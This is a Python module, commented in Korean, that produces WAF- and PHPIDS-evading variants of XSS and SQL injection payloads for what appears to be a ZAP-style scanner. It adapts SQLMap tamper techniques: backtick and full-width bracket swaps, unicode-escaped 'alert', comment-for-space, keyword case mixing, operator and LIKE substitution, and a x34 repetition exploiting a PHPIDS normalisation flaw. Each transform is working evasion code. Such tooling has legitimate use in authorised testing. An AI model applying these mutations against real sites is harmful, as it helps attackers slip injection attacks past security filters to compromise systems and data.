"""
순수 문자열 변환기 - WAF/PHPIDS 우회용 변형 문자열 목록을 반환
"""

from __future__ import annotations

import re
from typing import List


# ── XSS mutations ──────────────────────────────────────────────────────────────
#
# ZAP CrossSiteScriptingScanRule.mutateAttack() 기반 + PHPIDS 시그니처 우회 기법.
#
# Group 1: ( → `  ) → `        (괄호 차단 WAF 우회)
# Group 2: < → ＜  > → ＞      (각도 괄호 차단 WAF 우회, 전각문자)
# Group 3: 1+2 동시 적용
# Group 4: = → \t=\t           (속성 파싱은 공백 허용 → "onerror=" 등 정확매치 시그니처 우회)
# Group 5: alert( → alert(  (JS 유니코드 이스케이프 — 리터럴 "alert(" 문자열 시그니처 우회, 실행 결과는 동일)
# Group 6: 1+2+5 동시 적용

_MUTATIONS: List[List[tuple[str, str]]] = [
    [("(", "`"), (")", "`")],
    [("<", "＜"), (">", "＞")],
    [("(", "`"), (")", "`"), ("<", "＜"), (">", "＞")],
    [("=", "\t=\t")],
    [("alert(", "\\u0061lert(")],
    [("alert(", "\\u0061lert("), ("(", "`"), (")", "`"), ("<", "＜"), (">", "＞")],
]

def mutate_payload(payload: str) -> List[dict]:
    """XSS 페이로드 mutation 목록 반환."""
    results: List[dict] = []
    for group_idx, group in enumerate(_MUTATIONS):
        original_chars = [pair[0] for pair in group]
        if not any(c in payload for c in original_chars):
            continue
        mutated = payload
        for orig, replacement in group:
            mutated = mutated.replace(orig, replacement)
        if mutated == payload:
            continue
        desc = ", ".join(f"{o}→{r}" for o, r in group)
        results.append({
            "payload":     mutated,
            "group":       group_idx + 1,
            "description": f"group{group_idx + 1}: {desc}",
        })
    return results


# ── SQLi mutations ─────────────────────────────────────────────────────────────
#
# ZAP SqlInjectionScanRule에는 XSS처럼 별도 mutateAttack() 가 없으므로
# SQLMap tamper script + OWASP Testing Guide 기법을 적용.
#
# S1: 공백 → /**/       (space2comment — MySQL/PgSQL/MSSQL 모두 인식)
# S2: " -- " → " #"    (MySQL hash comment 우회)
# S3: 예약어 대소문자 혼용  (AnD, oR, SeLeCt — regex 시그니처 우회)
# S4: S1 + S3 동시 적용
# S5: AND/OR → &&/||           (키워드 매칭이 아닌 기호 연산자로 로직 표현 — 키워드 블랙리스트 우회)
# S6: '=' → ' LIKE '           (PHPIDS는 '=', '(', ''' 세 문자를 핵심 트리거로 사용 — 등호 회피)
# S7: payload를 SQL 주석으로 종결 후 반복(x34)  (PHPIDS 0.6.5 Converter.php 반복 패턴
#     정규화 취약점 — exploit-db #17726. 2문자 패턴이 32회+ 반복되면 anti-evasion
#     전처리 정규식이 무력화됨. DB에는 첫 조각만 유효, 나머지는 주석 처리됨)
#
# 제외: SLEEP / pg_sleep / dbms_pipe 등 함수명은 대소문자 혼용 시 DB 미인식 위험

_SQLI_KEYWORD_RE = re.compile(
    r"\b(AND|OR|NOT|SELECT|UNION|ALL|WHERE|ORDER|BY|FROM|HAVING|GROUP|"
    r"LIMIT|OFFSET|IN|EXISTS|BETWEEN|LIKE|WAITFOR|DELAY|NULL)\b",
    re.IGNORECASE,
)

_AND_RE = re.compile(r"\bAND\b", re.IGNORECASE)
_OR_RE  = re.compile(r"\bOR\b", re.IGNORECASE)
_EQ_RE  = re.compile(r"\s*=\s*")


def _mix_case(word: str) -> str:
    """짝수 인덱스 대문자, 홀수 인덱스 소문자."""
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word))


def mutate_sqli_payload(payload: str) -> List[dict]:
    """SQLi 페이로드 mutation 목록 반환.

    ERROR_META(단일 메타문자) 등 공백/키워드 없는 payload는 빈 목록.
    """
    results: List[dict] = []

    # S1: 공백 → /**/
    s1 = payload.replace(" ", "/**/") if " " in payload else None
    if s1 and s1 != payload:
        results.append({"payload": s1, "group": "S1", "description": "space→/**/"})

    # S2: " -- " → " #"  (MySQL hash comment)
    if " -- " in payload:
        s2 = payload.replace(" -- ", " #")
        if s2 != payload:
            results.append({"payload": s2, "group": "S2", "description": "comment -- →#"})

    # S3: 예약어 대소문자 혼용
    s3 = _SQLI_KEYWORD_RE.sub(lambda m: _mix_case(m.group()), payload)
    if s3 != payload:
        results.append({"payload": s3, "group": "S3", "description": "keyword case mix"})
    else:
        s3 = None

    # S4: S1 + S3 동시
    if s1 and s3:
        s4_base = _SQLI_KEYWORD_RE.sub(lambda m: _mix_case(m.group()), payload)
        s4 = s4_base.replace(" ", "/**/")
        if s4 not in {payload, s1, s3}:
            results.append({"payload": s4, "group": "S4", "description": "space→/**/ + case mix"})

    # S5: AND/OR → &&/||  (기호 연산자 치환)
    s5 = _OR_RE.sub("||", _AND_RE.sub("&&", payload))
    if s5 != payload:
        results.append({"payload": s5, "group": "S5", "description": "AND/OR→&&/|| (기호 연산자)"})

    # S6: '=' → ' LIKE '  (등호 회피)
    if "=" in payload:
        s6 = _EQ_RE.sub(" LIKE ", payload)
        if s6 != payload:
            results.append({"payload": s6, "group": "S6", "description": "=→LIKE (등호 회피)"})

    # S7: 주석 종결 + 반복(x34)  (PHPIDS Converter 반복패턴 정규화 취약점, exploit-db #17726)
    terminated = payload if payload.rstrip().endswith(("-- ", "-- -", "#", "/*")) else f"{payload}-- -"
    s7 = terminated * 34
    results.append({"payload": s7, "group": "S7", "description": "PHPIDS Converter 반복패턴 우회 (x34)"})

    return results

